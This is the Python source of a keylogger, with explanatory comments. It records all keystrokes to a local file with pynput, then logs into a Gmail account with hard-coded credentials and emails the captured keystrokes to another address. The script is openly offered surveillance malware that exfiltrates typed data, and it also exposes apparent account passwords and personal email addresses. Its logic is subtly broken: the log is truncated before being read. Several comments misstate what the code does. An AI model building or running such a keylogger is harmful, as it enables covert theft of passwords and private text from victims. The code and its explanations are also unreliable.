#Importing important libraries required to run this Email Keylogger

import pynput #Importing pynput module to fetching keyboard keys
from pynput.keyboard import * #Importing all modules pynput keyboard to increase program accurancy
import smtplib #Importing smtplib module for giving the functionality ot sned the mails
import time #Imporing time module which is also prequest-site for smtplib module

#-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

#Main Keylogger functioning
#Creating an "Logs.txt" if not present otherwise opening it
file_obj=open("Logs.txt",'a') #Opening the file "Logs.txt" with the "append mode" to capture all the keys.

#Creating a function for "printing and writing keys" to our file i.e "Logs.txt"
def pressed(key): #"Taking key" as an "argument"
    print(key) #"Printing keys" on "console"
    file_obj.write(str(key)) #"Writing Keys" to "Logs.txt"

#Creating a function for closing the Email Keylogger wiht the appropriate key
def released(key): #"Taking key" as a "argument"
    if key==Key.esc: #When "key" is equal to "Key.esc" i.e escape key
        return False #If the condition is "true then program will run" and if "false program will quit"

#Creating a listener to Fetching the keys and then appending to a file.
with Listener(on_press=pressed,on_release=released) as l: #Taking pressed and released function as a argument with the functions "on_press" and "on_release"
    l.join() #Calling the "join" function for "concatenation of the keys".

#file_obj.close() #Can be used if we want open the file in append mode

#-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

#Sending mails
mail=smtplib.SMTP("smtp.gmail.com",587) #Initilizing an Object for "SMTP mail" wiht the "port 587"
mail.starttls() #Starting the "TLS" service for secure login
mail.login("phoenixguy307@gmail.com","asqvvwhfkowalaex") #Logging in with the mail an password
file_obj=open("Logs.txt","w+") #Fuction to open the "Logs.txt" with "Write +" mode i.e "Truncate" which is used for removing the existing text from the files and the writing a new set of keys.
message=file_obj.read() #Fuction to "read the text" present in the file
file_obj.write('') #Function to "writing the new set of keys" captured by the program
file_obj.close() #Function to closing the file after editing and reading it
mail.sendmail("phoenixguy307@gmail.com","nikitsingh2001@gmail.com",message) #Fuction to send the mail with the arguments presents "From whome" , "To whome" ,"the message"
mail.quit() #Function to "closing the mail server"
